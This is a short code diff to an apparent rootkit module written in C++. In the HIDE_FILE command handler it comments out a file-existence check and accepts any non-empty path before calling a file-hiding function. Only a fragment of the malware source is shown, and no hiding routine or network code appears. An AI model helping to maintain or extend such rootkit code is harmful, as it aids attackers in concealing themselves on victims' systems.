@@ -72,9 +72,10 @@ void Rootkit::module_impl()
             break;
         }
         case HIDE_FILE: {
-            std::cout << "HIDE_FILE: " << rootkit_args << std::endl;
+            std::cout << "HIDE_FILE: " << rootkit_args << std::endl;           
             // rootkit_args should be a path to vaild file
-            if (boost::filesystem::exists(rootkit_args)) {
+            // if (boost::filesystem::exists(rootkit_args)) {
+            if (rootkit_args.length() > 0){
                 hide_filename(rootkit_args.c_str());
             } else {
                 Rootkit::send_err(inner, std::string("File doesn't exist: ") + rootkit_args);
